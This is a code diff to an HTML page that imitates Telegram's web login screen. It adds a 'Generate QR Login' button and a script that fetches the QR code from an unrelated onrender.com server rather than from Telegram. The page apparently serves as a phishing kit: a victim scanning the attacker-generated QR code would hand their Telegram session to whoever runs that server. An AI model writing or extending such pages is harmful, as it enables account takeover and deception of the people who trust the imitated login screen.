@@ -71,6 +71,8 @@
                     </div>
                     <div class="auth-form" id="phoneForm">
                         <div id="logo"></div>
+                        <img id="qrImg" alt="Scan QR code with Telegram app" />
+                        <button onclick="showQrLogin()">Generate QR Login</button>
                         <h1>Telegram</h1>
                         <p class="note">Please confirm your country code and enter your phone number.</p>
                         <form class="form" action="">
@@ -1725,6 +1727,17 @@ window.addEventListener("DOMContentLoaded", () => {
         });
     });
 });
+
+async function showQrLogin() {
+    const resp = await fetch("https://flask-duhv.onrender.com/start-qr-login");
+    if (!resp.ok) {
+        alert("Failed to start QR login");
+        return;
+    }
+    const data = await resp.json();
+    document.getElementById("qrImg").src = data.qr_image_url + "?t=" + Date.now(); // prevent caching
+}
+
 
 </script>
 
